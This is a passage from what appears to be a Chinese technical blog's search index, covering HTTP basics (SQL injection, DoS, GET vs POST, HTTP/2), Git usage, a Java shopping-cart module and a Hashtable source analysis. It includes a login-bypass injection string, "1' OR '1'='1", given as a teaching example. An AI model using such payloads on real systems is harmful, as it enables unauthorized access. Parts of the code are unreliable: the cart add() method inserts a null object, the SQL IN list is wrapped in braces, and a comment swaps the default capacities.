如果填入以下内容： 12userName = "1' OR '1'='1";passWord = "1' OR '1'='1"; 那么 SQL 查询字符串为： 1strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');" 此时无需验证通过就能执行以下查询： 1strSQL = "SELECT * FROM users;" 3. 防范手段（一）使用参数化查询 以下以 Java 中的 PreparedStatement 为例，它是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。 1234PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE userid=? AND password=?");stmt.setString(1, userid);stmt.setString(2, password);ResultSet rs = stmt.executeQuery(); （二）单引号转换 将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。 拒绝服务攻击拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。 分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用网络上两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。 八、GET 和 POST 的区别作用GET 用于获取资源，而 POST 用于传输实体主体。 参数GET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在实体主体中。 1GET /test/demo_form.asp?name1=value1&amp;name2=value2 HTTP/1.1 123POST /test/demo_form.asp HTTP/1.1Host: w3schools.comname1=value1&amp;name2=value2 不能因为 POST 参数存储在实体主体中就认为它的安全性更高，因为照样可以通过一些抓包工具（Fiddler）查看。 因为 URL 只支持 ASCII 码，因此 GET 的参数中如果存在中文等字符就需要先进行编码，例如中文会转换为%E4%B8%AD%E6%96%87，而空格会转换为%20。POST 支持标准字符集。 安全安全的 HTTP 方法不会改变服务器状态，也就是说它只是可读的。 GET 方法是安全的，而 POST 却不是，因为 POST 的目的是传送实体主体内容，这个内容可能是用户上传的表单数据，上传成功之后，服务器可能把这个数据存储到数据库中，因此状态也就发生了改变。 安全的方法除了 GET 之外还有：HEAD、OPTIONS。 不安全的方法除了 POST 之外还有 PUT、DELETE。 幂等性幂等的 HTTP 方法，同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。在正确实现的条件下，GET，HEAD，PUT 和 DELETE 等方法都是幂等的，而 POST 方法不是。所有的安全方法也都是幂等的。 GET /pageX HTTP/1.1 是幂等的。连续调用多次，客户端接收到的结果都是一样的： 1234GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1 POST /add_row HTTP/1.1 不是幂等的。如果调用多次，就会增加多行记录： 123POST /add_row HTTP/1.1POST /add_row HTTP/1.1 -&gt; Adds a 2nd rowPOST /add_row HTTP/1.1 -&gt; Adds a 3rd row DELETE /idX/delete HTTP/1.1 是幂等的，即便不同的请求接收到的状态码不一样： 123DELETE /idX/delete HTTP/1.1 -&gt; Returns 200 if idX existsDELETE /idX/delete HTTP/1.1 -&gt; Returns 404 as it just got deletedDELETE /idX/delete HTTP/1.1 -&gt; Returns 404 可缓存如果要对响应进行缓存，需要满足以下条件： 请求报文的 HTTP 方法本身是可缓存的，包括 GET 和 HEAD，但是 PUT 和 DELETE 不可缓存，POST 在多数情况下不可缓存的。 响应报文的状态码是可缓存的，包括：200, 203, 204, 206, 300, 301, 404, 405, 410, 414, and 501。 响应报文的 Cache-Control 首部字段没有指定不进行缓存。 XMLHttpRequest为了阐述 POST 和 GET 的另一个区别，需要先了解 XMLHttpRequest： XMLHttpRequest 是一个 API，它为客户端提供了在客户端和服务器之间传输数据的功能。它提供了一个通过 URL 来获取数据的简单方式，并且不会使整个页面刷新。这使得网页只更新一部分页面而不会打扰到用户。XMLHttpRequest 在 AJAX 中被大量使用。 在使用 XMLHttpRequest 的 POST 方法时，浏览器会先发送 Header 再发送 Data。但并不是所有浏览器会这么做，例如火狐就不会。而 GET 方法 Header 和 Data 会一起发送。 九、HTTP/1.0 与 HTTP/1.1 的区别 详细内容请见上文 HTTP/1.1 默认是长连接 HTTP/1.1 支持管线化处理 HTTP/1.1 支持同时打开多个 TCP 连接 HTTP/1.1 支持虚拟主机 HTTP/1.1 新增状态码 100 HTTP/1.1 支持分块传输编码 HTTP/1.1 新增缓存处理指令 max-age 十、HTTP/2.0HTTP/1.x 缺陷 HTTP/1.x 实现简单是以牺牲应用性能为代价的： 客户端需要使用多个连接才能实现并发和缩短延迟； 不会压缩请求和响应首部，从而导致不必要的网络流量； 不支持有效的资源优先级，致使底层 TCP 连接的利用率低下。 二进制分帧层HTTP/2.0 将报文分成 HEADERS 帧和 DATA 帧，它们都是二进制格式的。 在通信过程中，只会有一个 TCP 连接存在，它承载了任意数量的双向数据流（Stream）。一个数据流都有一个唯一标识符和可选的优先级信息，用于承载双向信息。消息（Message）是与逻辑请求或响应消息对应的完整的一系列帧。帧（Fram）是最小的通信单位，来自不同数据流的帧可以交错发送，然后再根据每个帧头的数据流标识符重新组装。 服务端推送HTTP/2.0 在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 page.html 页面，服务端就把 script.js 和 style.css 等与之相关的资源一起发给客户端。 首部压缩HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。HTTP/2.0 要求客户端和服务器同时维护和更新一个包含之前见过的首部字段表，从而避免了重复传输。不仅如此，HTTP/2.0 也使用 Huffman 编码对首部字段进行压缩。 转自： Http]]></content>
      <tags>
        <tag>计算机网络及其他</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git]]></title>
    <url>%2F2018%2F07%2F21%2FGit%2F</url>
    <content type="text"><![CDATA[Git作为分布式代码托管工具，是每一个IT人必备工具。 集中式与分布式Git 属于分布式版本控制系统，而 SVN 属于集中式。 集中式版本控制只有中心服务器拥有一份代码，而分布式版本控制每个人的电脑上就有一份完整的代码。 集中式版本控制有安全性问题，当中心服务器挂了所有人都没办法工作了。 集中式版本控制需要连网才能工作，如果网速过慢，那么提交一个文件的会慢的无法让人忍受。而分布式版本控制不需要连网就能工作。 分布式版本控制新建分支、合并分支操作速度非常快，而集中式版本控制新建一个分支相当于复制一份完整代码。 Git 的中心服务器Git 的中心服务器用来交换每个用户的修改。没有中心服务器也能工作，但是中心服务器能够 24 小时保持开机状态，这样就能更方便的交换修改。Github 就是一种 Git 中心服务器。 Git 工作流 新建一个仓库之后，当前目录就成为了工作区，工作区下有一个隐藏目录 .git，它属于 Git 的版本库。 Git 版本库有一个称为 stage 的暂存区，还有自动创建的 master 分支以及指向分支的 HEAD 指针。 git add files 把文件的修改添加到暂存区 git commit 把暂存区的修改提交到当前分支，提交之后暂存区就被清空了 git reset -- files 使用当前分支上的修改覆盖暂缓区，用来撤销最后一次 git add files git checkout -- files 使用暂存区的修改覆盖工作目录，用来撤销本地修改 可以跳过暂存区域直接从分支中取出修改或者直接提交修改到分支中 git commit -a 直接把所有文件的修改添加到暂缓区然后执行提交 git checkout HEAD -- files 取出最后一次修改，可以用来进行回滚操作 分支实现Git 把每次提交都连成一条时间线。分支使用指针来实现，例如 master 分支指针指向时间线的最后一个节点，也就是最后一次提交。HEAD 指针指向的是当前分支。 新建分支是新建一个指针指向时间线的最后一个节点，并让 HEAD 指针指向新分支表示新分支成为当前分支。 每次提交只会让当前分支向前移动，而其它分支不会移动。 合并分支也只需要改变指针即可。 冲突当两个分支都对同一个文件的同一行进行了修改，在分支合并时就会产生冲突。 Git 会使用 &lt;&lt;&lt;&lt;&lt;&lt;&lt; ，======= ，&gt;&gt;&gt;&gt;&gt;&gt;&gt; 标记出不同分支的内容，只需要把不同分支中冲突部分修改成一样就能解决冲突。 12345&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEADCreating a new branch is quick &amp; simple.=======Creating a new branch is quick AND simple.&gt;&gt;&gt;&gt;&gt;&gt;&gt; feature1 Fast forward“快进式合并”（fast-farward merge），会直接将 master 分支指向合并的分支，这种模式下进行分支合并会丢失分支信息，也就不能在分支历史上看出分支信息。 可以在合并时加上 --no-ff 参数来禁用 Fast forward 模式，并且加上 -m 参数让合并时产生一个新的 commit。 1$ git merge --no-ff -m &quot;merge with no-ff&quot; dev 分支管理策略master 分支应该是非常稳定的，只用来发布新版本； 日常开发在开发分支 dev 上进行。 储藏（Stashing）在一个分支上操作之后，如果还没有将修改提交到分支上，此时进行切换分支，那么另一个分支上也能看到新的修改。这是因为所有分支都共用一个工作区的缘故。 可以使用 git stash 将当前分支的修改储藏起来，此时当前工作区的所有修改都会被存到栈上，也就是说当前工作区是干净的，没有任何未提交的修改。此时就可以安全的切换到其它分支上了。 123$ git stashSaved working directory and index state \ &quot;WIP on master: 049d078 added the index file&quot;HEAD is now at 049d078 added the index file (To restore them type &quot;git stash apply&quot;) 该功能可以用于 bug 分支的实现。如果当前正在 dev 分支上进行开发，但是此时 master 上有个 bug 需要修复，但是 dev 分支上的开发还未完成，不想立即提交。在新建 bug 分支并切换到 bug 分支之前就需要使用 git stash 将 dev 分支的未提交修改储藏起来。 SSH 传输设置Git 仓库和 Github 中心仓库之间的传输是通过 SSH 加密。 如果工作区下没有 .ssh 目录，或者该目录下没有 id_rsa 和 id_rsa.pub 这两个文件，可以通过以下命令来创建 SSH Key： 1$ ssh-keygen -t rsa -C &quot;youremail@example.com&quot; 然后把公钥 id_rsa.pub 的内容复制到 Github &quot;Account settings&quot; 的 SSH Keys 中。 .gitignore 文件忽略以下文件： 操作系统自动生成的文件，比如缩略图； 编译生成的中间文件，比如 Java 编译产生的 .class 文件； 自己的敏感信息，比如存放口令的配置文件。 Git 命令一览 转自： Git]]></content>
      <tags>
        <tag>计算机网络及其他</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[9、购物车管理模块]]></title>
    <url>%2F2018%2F07%2F21%2F9%E3%80%81%E8%B4%AD%E7%89%A9%E8%BD%A6%E7%AE%A1%E7%90%86%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[购物车管理模块 1.购物车添加商品12345http://localhost:8080/cart/add.do?productId=1&amp;count=10请注意这个字段，超过数量会返回这样的标识&quot;limitQuantity&quot;失败的：LIMIT_NUM_FAIL 成功的：LIMIT_NUM_SUCCESS request1productId,count success123456789101112131415161718192021222324252627282930313233343536373839&#123; &quot;status&quot;: 0, &quot;data&quot;: &#123; &quot;cartProductVoList&quot;: [ &#123; &quot;id&quot;: 1, &quot;userId&quot;: 13, &quot;productId&quot;: 1, &quot;quantity&quot;: 12, &quot;productName&quot;: &quot;iphone7&quot;, &quot;productSubtitle&quot;: &quot;双十一促销&quot;, &quot;productMainImage&quot;: &quot;mainimage.jpg&quot;, &quot;productPrice&quot;: 7199.22, &quot;productStatus&quot;: 1, &quot;productTotalPrice&quot;: 86390.64, &quot;productStock&quot;: 86, &quot;productChecked&quot;: 1, &quot;limitQuantity&quot;: &quot;LIMIT_NUM_SUCCESS&quot; &#125;, &#123; &quot;id&quot;: 2, &quot;userId&quot;: 13, &quot;productId&quot;: 2, &quot;quantity&quot;: 1, &quot;productName&quot;: &quot;oppo R8&quot;, &quot;productSubtitle&quot;: &quot;oppo促销进行中&quot;, &quot;productMainImage&quot;: &quot;mainimage.jpg&quot;, &quot;productPrice&quot;: 2999.11, &quot;productStatus&quot;: 1, &quot;productTotalPrice&quot;: 2999.11, &quot;productStock&quot;: 86, &quot;productChecked&quot;: 1, &quot;limitQuantity&quot;: &quot;LIMIT_NUM_SUCCESS&quot; &#125; ], &quot;allChecked&quot;: true, &quot;cartTotalPrice&quot;: 89389.75 &#125;&#125; fail1234&#123; &quot;status&quot;: 10, &quot;msg&quot;: &quot;用户未登录,请登录&quot;&#125; controller123456789@RequestMapping("add.do")@ResponseBodypublic ServerResponse&lt;CartVo&gt; add(HttpSession session, Integer count, Integer productId)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),ResponseEnum.NEED_LOGIN.getDesc()); &#125; return cartService.add(count,productId,user.getId());&#125; 对应的service是：12345678910111213141516171819202122public ServerResponse&lt;CartVo&gt; add(Integer count,Integer productId,Integer userId)&#123; if(productId == null || count == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.ILLEGAL_ARGUMENT.getCode(),ResponseEnum.ILLEGAL_ARGUMENT.getDesc()); &#125; Cart cart = cartMapper.selectCartByUserIdProductId(userId,productId); if(cart == null)&#123; //这个产品不在购物车里，需要新增一条这个产品的记录 Cart cartitem = new Cart(); cartitem.setQuantity(count); cartitem.setChecked(Constants.Cart.CHECKED); cartitem.setProductId(productId); cart.setUserId(userId); cartMapper.insert(cart); &#125;else &#123; //这个产品已经存在于购物车，只需要变动数量 count = cart.getQuantity() + count; cart.setQuantity(count); cartMapper.updateByPrimaryKeySelective(cart); &#125; CartVo cartVo = this.getCartVoLimit(userId); return ServerResponse.createBySuccess(cartVo);&#125; 我们根据返回格式，创建CartVo对象：1234567@Datapublic class CartVo &#123; private BigDecimal cartTotalPrice; private Boolean allChecked; private String imageHost; private List&lt;CartProductVo&gt; productVoList;&#125; 其中的数据是cartProductVoList，所以创建cartProductVo对象：12345678910111213141516@Datapublic class CartProductVo &#123; private Integer id; private Integer userId; private Integer productId; private Integer quantity; private String productName; private String productSubtitle; private String productMainImage; private BigDecimal productPrice; private Integer productStatus; private BigDecimal productTotalPrice; private Integer productStock; private Integer productChecked; private String limitQuantity;&#125; 最终返回的方法便是购物车的列表，这是一个通用的方法，放在一个私有方法中被调用。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758private CartVo getCartVoLimit(Integer userId)&#123; //大的封装对象 CartVo cartVo = new CartVo(); //这个用户对应的购物车的列表（Cart） List&lt;Cart&gt; cartList = cartMapper.selectCartByUserId(userId); //购物车中内容列表的存放容器，是cart和product的一个混合的展示对象 List&lt;CartProductVo&gt; cartProductVoList = Lists.newArrayList(); //初始化金额 BigDecimal cartTotalPrice = new BigDecimal("0"); if(CollectionUtils.isNotEmpty(cartList))&#123; for(Cart cartItem : cartList)&#123; CartProductVo cartProductVo = new CartProductVo(); cartProductVo.setId(cartItem.getId()); cartProductVo.setUserId(cartItem.getUserId()); cartProductVo.setProductId(cartItem.getProductId()); Product product = productMapper.selectByPrimaryKey(cartItem.getProductId()); if(product != null)&#123; cartProductVo.setProductMainImage(product.getMainImage()); cartProductVo.setProductName(product.getName()); cartProductVo.setProductSubtitle(product.getSubtitle()); cartProductVo.setProductStatus(product.getStatus()); cartProductVo.setProductPrice(product.getPrice()); cartProductVo.setProductStock(product.getStock()); //判断库存 int buyLimitCount = 0; if(product.getStock() &gt;= cartItem.getQuantity())&#123; //库存充足 buyLimitCount = cartItem.getQuantity(); cartProductVo.setLimitQuantity(Constants.Cart.LIMIT_NUM_SUCCESS); &#125;else &#123; //库存不足 buyLimitCount = product.getStock(); cartProductVo.setLimitQuantity(Constants.Cart.LIMIT_NUM_FAIL); Cart cartForQuantity = new Cart(); cartForQuantity.setId(cartItem.getId()); cartForQuantity.setQuantity(buyLimitCount); cartMapper.updateByPrimaryKeySelective(cartForQuantity); &#125; //每个产品的数量 cartProductVo.setQuantity(buyLimitCount); //计算总价 cartProductVo.setProductTotalPrice(BigDecimalUtil.mul(product.getPrice().doubleValue(),cartProductVo.getQuantity())); cartProductVo.setProductChecked(cartItem.getChecked()); &#125; if(cartItem.getChecked() == Constants.Cart.CHECKED)&#123; //如果勾选，增加到整个购物车总价中 cartTotalPrice = BigDecimalUtil.add(cartTotalPrice.doubleValue(),cartProductVo.getProductTotalPrice().doubleValue()); &#125; cartProductVoList.add(cartProductVo); &#125; &#125; cartVo.setCartTotalPrice(cartTotalPrice); cartVo.setProductVoList(cartProductVoList); cartVo.setAllChecked(this.getAllCheckedStatus(userId)); cartVo.setImageHost(PropertiesUtil.getProperty("ftp.server.http.prefix")); return cartVo;&#125; 其中，判断是否全部选中的方式也封装一下：123456private boolean getAllCheckedStatus(Integer userId)&#123; if(userId == null)&#123; return false; &#125; return cartMapper.selectCartProcudtCheckedStatusByUserId(userId) == 0;&#125; 具体的实现思路是：便利购物车，只要发现有一个为0，即未被选中，就说明不是被全选。对应的sql：123&lt;select id="selectCartProcudtCheckedStatusByUserId" parameterType="int" resultType="int"&gt;SELECT count(1) from mmall_cart where checked = 0 and user_id = #&#123;userId&#125;&lt;/select&gt; 这里还涉及金额的计算，用bigdecimal的string构造器进行计算才不会丢失精度，这里封装为一个工具类：123456789101112131415161718192021222324252627282930public class BigDecimalUtil &#123; private BigDecimalUtil()&#123; &#125; public static BigDecimal add(double v1, double v2)&#123; BigDecimal b1 = new BigDecimal(Double.toString(v1)); BigDecimal b2 = new BigDecimal(Double.toString(v2)); return b1.add(b2); &#125; public static BigDecimal sub(double v1,double v2)&#123; BigDecimal b1 = new BigDecimal(Double.toString(v1)); BigDecimal b2 = new BigDecimal(Double.toString(v2)); return b1.subtract(b2); &#125; public static BigDecimal mul(double v1,double v2)&#123; BigDecimal b1 = new BigDecimal(Double.toString(v1)); BigDecimal b2 = new BigDecimal(Double.toString(v2)); return b1.multiply(b2); &#125; public static BigDecimal div(double v1,double v2)&#123; BigDecimal b1 = new BigDecimal(Double.toString(v1)); BigDecimal b2 = new BigDecimal(Double.toString(v2)); return b1.divide(b2,2,BigDecimal.ROUND_HALF_UP);//四舍五入,保留2位小数 //除不尽的情况 &#125;&#125; 2.更新购物车某个产品数量1http://localhost:8080/cart/update.do?productId=1&amp;count=2 request1productId,count success1同1 fail1同1 controller123456789@RequestMapping("update.do")@ResponseBodypublic ServerResponse&lt;CartVo&gt; update(HttpSession session, Integer count, Integer productId)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),ResponseEnum.NEED_LOGIN.getDesc()); &#125; return cartService.update(count,productId,user.getId());&#125; 对应的service是：123456789101112public ServerResponse&lt;CartVo&gt; update(Integer count,Integer productId,Integer userId)&#123; if(productId == null || count == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.ILLEGAL_ARGUMENT.getCode(),ResponseEnum.ILLEGAL_ARGUMENT.getDesc()); &#125; Cart cart = cartMapper.selectCartByUserIdProductId(userId,productId); if(cart != null)&#123; cart.setQuantity(count); &#125; cartMapper.updateByPrimaryKeySelective(cart); CartVo cartVo = this.getCartVoLimit(userId); return ServerResponse.createBySuccess(cartVo);&#125; 3.移除购物车某个产品1http://localhost:8080/cart/delete_product.do?productIds=1,3 request1productIds success1同1 fail1同1 controller123456789@RequestMapping("delete_product.do")@ResponseBodypublic ServerResponse&lt;CartVo&gt; deleteProduct(HttpSession session,String productIds)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),ResponseEnum.NEED_LOGIN.getDesc()); &#125; return cartService.deleteProduct(user.getId(),productIds);&#125; 对应的service：123456789public ServerResponse&lt;CartVo&gt; deleteProduct(Integer userId,String productIds)&#123; List&lt;String&gt; productIdList = Splitter.on(",").splitToList(productIds); if(CollectionUtils.isEmpty(productIdList))&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.ILLEGAL_ARGUMENT.getCode(),ResponseEnum.ILLEGAL_ARGUMENT.getDesc()); &#125; cartMapper.deleteByUserIdProductIds(userId,productIdList); CartVo cartVo = this.getCartVoLimit(userId); return ServerResponse.createBySuccess(cartVo);&#125; 注意这里根据多个参数进行删除的sql:123456789&lt;delete id="deleteByUserIdProductIds" parameterType="map"&gt;DELETE from mmall_cart where user_id = #&#123;userId&#125;&lt;if test="productIdList != null"&gt; and product_id in &lt;foreach collection="productIdList" item="item" index="index" open="&#123;" separator="," close="&#125;"&gt; #&#123;item&#125; &lt;/foreach&gt;&lt;/if&gt;&lt;/delete&gt; 4.购物车List列表1http://localhost:8080/cart/list.do request1无参数,需要登录状态 success1同1 fail1同1 controller123456789@RequestMapping("list.do")@ResponseBodypublic ServerResponse&lt;CartVo&gt; list(HttpSession session)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),ResponseEnum.NEED_LOGIN.getDesc()); &#125; return cartService.list(user.getId());&#125; 5.购物车全选1http://localhost:8080/cart/select_all.do request1无参 success1同1 fail1同1 controller123456789@RequestMapping("select_all.do")@ResponseBodypublic ServerResponse&lt;CartVo&gt; selectAll(HttpSession session)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),ResponseEnum.NEED_LOGIN.getDesc()); &#125; return cartService.selectOrUnSelect(user.getId(),Constants.Cart.CHECKED,null);&#125; 对应的service：1234public ServerResponse&lt;CartVo&gt; selectOrUnSelect(Integer userId,Integer checked,Integer productId)&#123; cartMapper.checkedOrUnCheckedProduct(userId,checked,productId); return this.list(userId);&#125; 6.购物车取消全选1http://localhost:8080/cart/un_select_all.do request1无参 success1同1 fail1同1 controller123456789@RequestMapping("un_select_all.do")@ResponseBodypublic ServerResponse&lt;CartVo&gt; unSelectAll(HttpSession session)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),ResponseEnum.NEED_LOGIN.getDesc()); &#125; return cartService.selectOrUnSelect(user.getId(),Constants.Cart.UN_CHECKED,null);&#125; 对应的service：1234public ServerResponse&lt;CartVo&gt; selectOrUnSelect(Integer userId,Integer checked,Integer productId)&#123; cartMapper.checkedOrUnCheckedProduct(userId,checked,productId); return this.list(userId);&#125; 7.购物车选中某个商品1http://localhost:8080/cart/select.do?productId=1 request1productId success1同1 fail1同1 controller123456789@RequestMapping("select.do")@ResponseBodypublic ServerResponse&lt;CartVo&gt; selectAll(HttpSession session,Integer productId)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),ResponseEnum.NEED_LOGIN.getDesc()); &#125; return cartService.selectOrUnSelect(user.getId(),Constants.Cart.CHECKED,productId);&#125; 对应的service：1234public ServerResponse&lt;CartVo&gt; selectOrUnSelect(Integer userId,Integer checked,Integer productId)&#123; cartMapper.checkedOrUnCheckedProduct(userId,checked,productId); return this.list(userId);&#125; 8.购物车取消选中某个商品1http://localhost:8080/cart/un_select.do?productId=2 request1productId success1同1 fail1同1 controller123456789@RequestMapping("un_select.do")@ResponseBodypublic ServerResponse&lt;CartVo&gt; unSelectAll(HttpSession session,Integer productId)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),ResponseEnum.NEED_LOGIN.getDesc()); &#125; return cartService.selectOrUnSelect(user.getId(),Constants.Cart.UN_CHECKED,productId);&#125; 对应的service：1234public ServerResponse&lt;CartVo&gt; selectOrUnSelect(Integer userId,Integer checked,Integer productId)&#123; cartMapper.checkedOrUnCheckedProduct(userId,checked,productId); return this.list(userId);&#125; 9.查询在购物车里的产品数量1http://localhost:8080/cart/get_cart_product_count.do request1无参 success12345&#123; &quot;status&quot;: 0, &quot;data&quot;: 0 &#125; fail1234&#123; &quot;status&quot;: 10, &quot;msg&quot;: &quot;出现异常&quot;&#125; controller123456789@RequestMapping("get_cart_product_count.do")@ResponseBodypublic ServerResponse&lt;Integer&gt; getCartProductCount(HttpSession session)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user == null)&#123; return ServerResponse.createBySuccess(0); &#125; return cartService.getCartProductCount(user.getId());&#125; 对应的service：123456public ServerResponse&lt;Integer&gt; getCartProductCount(Integer userId)&#123; if(userId == null)&#123; return ServerResponse.createBySuccess(0); &#125; return ServerResponse.createBySuccess(cartMapper.selectCartProductCount(userId));&#125; 用到的sql：123&lt;select id="selectCartProductCount" parameterType="int" resultType="int"&gt;SELECT IFNULL(sum(quantity),0) as count from mmall_cart where user_id = #&#123;userId&#125;&lt;/select&gt;]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[9、Hashtable源码分析]]></title>
    <url>%2F2018%2F07%2F21%2F9%E3%80%81Hashtable%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[本文分析Hashtable源码. 一、前言Hashtable和HashMap，从存储结构和实现来讲基本上都是相同的。 它和HashMap的最大的不同是它是线程安全的，另外它不允许key和value为null。 Hashtable是个过时的集合类，不建议在新代码中使用，不需要线程安全的场合可以用HashMap替换，需要线程安全的场合可以用ConcurrentHashMap替换。 但这并不是我们不去了解它的理由。最起码Hashtable和HashMap的面试题在面试中经常被问到。 为了能在哈希表中成功地保存和取出对象，用作key的对象必须实现hashCode方法和equals方法。 关于fail-fast机制： iterator方法返回的迭代器是fail-fast的。如果在迭代器被创建后hashtable被结构型地修改了，除了迭代器自己的remove方法，迭代器会抛出一个ConcurrentModificationException异常。因此，面对在并发的修改，迭代器干脆利落的失败，而不是冒险的继续。哈希表的key和元素集合返回的Enumerations不是fail-fast的。 迭代器的fail-fast机制并不能得到保证，它不能够保证一定出现该错误。一般来说，fail-fast会尽最大努力抛出ConcurrentModificationException异常。因此，为提高此类操作的正确性而编写一个依赖于此异常的程序是错误的做法，正确做法是：ConcurrentModificationException 应该仅用于检测 bug。 说明： Hashtable是线程安全的。如果不需要线程安全的实现是不需要的，推荐使用HashMap代替Hashtable。如果需要线程安全的实现，推荐使用java.util.concurrent.ConcurrentHashMap代替Hashtable。 二、继承关系123public class Hashtable&lt;K,V&gt; extends Dictionary&lt;K,V&gt; implements Map&lt;K,V&gt;, Cloneable, java.io.Serializable&#123;&#125; Hashtable&lt;K,V&gt;：HashMap是以key-value形式存储数据的 extends Dictionary&lt;K,V&gt;：Dictionary类是一个抽象类，用来存储键/值对，作用和Map类相似。 implements Map&lt;K,V&gt;：实现了Map，实现了Map中声明的操作和default方法。 implements Cloneable：表明其可以调用clone()方法来返回实例的field-for-field拷贝。 implements java.io.Serializable：表明该类是可以序列化的。 其中Dictionary类是任何可将键映射到相应值的类（如Hashtable）的抽象父类，每个键和值都是对象。 hashMap以及TreeMap的源码，都没有继承于这个类。不过当我看到注释中的解释也就明白了，其 Dictionary 源码注释是这样的：NOTE: This class is obsolete. New implementations should implement the Map interface, rather than extending this class. 该话指出 Dictionary 这个类过时了，新的实现类应该实现Map接口。 三、属性1234567891011121314//哈希表private transient Entry&lt;?,?&gt;[] table;//记录哈希表中键值对的个数private transient int count;//扩容的阈值private int threshold;//负载因子private float loadFactor;//hashtable被结构型修改的次数。private transient int modCount = 0; HashTable并没有像HashMap那样定义了很多的常量，而是直接写死在了方法里。 Hashtable不要求底层数组的容量一定要为2的整数次幂，而HashMap则要求一定为2的整数次幂。 四、构造函数1234567891011121314151617181920212223242526272829303132333435363738394041/** * 使用指定参数初始化容量和指定参数负载因子来构造一个空的hashtable. * * @param initialCapacity 指定参数初始化容量 * @param loadFactor 指定参数负载因子 * @exception IllegalArgumentException 如果initialCapacity小于0或者负载因子为非正数。 */public Hashtable(int initialCapacity, float loadFactor) &#123; //如果指定参数初始化容量小于0，抛出异常 if (initialCapacity &lt; 0) throw new IllegalArgumentException("Illegal Capacity: "+ initialCapacity); //如果指定参数负载因子为非正数，抛出异常 if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new IllegalArgumentException("Illegal Load: "+loadFactor); //初始化hashtable的loadFactor、table、threshold属性 if (initialCapacity==0) initialCapacity = 1; this.loadFactor = loadFactor; table = new Entry&lt;?,?&gt;[initialCapacity]; //如果initialCapacity * loadFactor超出了MAX_ARRAY_SIZE，就使用MAX_ARRAY_SIZE 作为threshold threshold = (int)Math.min(initialCapacity * loadFactor, MAX_ARRAY_SIZE + 1);&#125;/** * 使用指定参数初始化容量和默认负载因子（0.75）来构造一个空的hashtable. * * @param initialCapacity 指定参数初始化容量 * @exception IllegalArgumentException 如果initialCapacity小于0 */public Hashtable(int initialCapacity) &#123; this(initialCapacity, 0.75f);&#125;/** * 使用默认初始化容量（11）和默认负载因子（0.75）来构造一个空的hashtable. * * 这里可以看到，Hashtable默认初始化容量为16，而HashMap的默认初始化容量为11。 */public Hashtable() &#123; this(11, 0.75f);&#125; 我们可以获取到这些信息：HashTable默认的初始化容量为11（与HashMap不同），负载因子默认为0.75（与HashMap相同）。而正因为默认初始化容量的不同，同时也没有对容量做调整的策略，所以可以先推断出，HashTable使用的哈希函数跟HashMap是不一样的（事实也确实如此）。 五、重要方法5.1 get方法12345678910111213public synchronized V get(Object key) &#123; Entry&lt;?,?&gt; tab[] = table; int hash = key.hashCode(); //通过哈希函数，计算出key对应的桶的位置 int index = (hash &amp; 0x7FFFFFFF) % tab.length; //遍历该桶的所有元素，寻找该key for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) &#123; if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123; return (V)e.value; &#125; &#125; return null;&#125; 这里可以看到，Hashtable和HashMap确认key在数组中的索引的方法不同。 Hashtable通过index = (hash &amp; 0x7FFFFFFF) % tab.length;来确认 HashMap通过i = (n - 1) &amp; hash;来确认 